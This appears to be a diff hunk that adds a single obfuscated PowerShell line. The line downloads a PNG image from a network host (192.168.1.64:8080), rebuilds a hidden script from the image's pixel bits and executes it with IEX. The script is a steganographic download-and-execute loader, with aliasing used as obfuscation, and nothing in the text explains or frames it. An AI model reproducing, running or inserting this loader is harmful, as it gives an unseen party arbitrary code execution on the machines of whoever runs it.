@@ -1,0 +1,1 @@
+Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load("http://192.168.1.64:8080/chip.png");$gg=$dd.Image;$oo=abc Byte[] 3000;(0..0)|%{foreach($x in(0..2999)){$p=$gg.GetPixel($x,$_);$oo[$_*3000+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};$egh=[System.Text.Encoding]::UTF8.GetString($oo[0..1328]);IEX($egh)
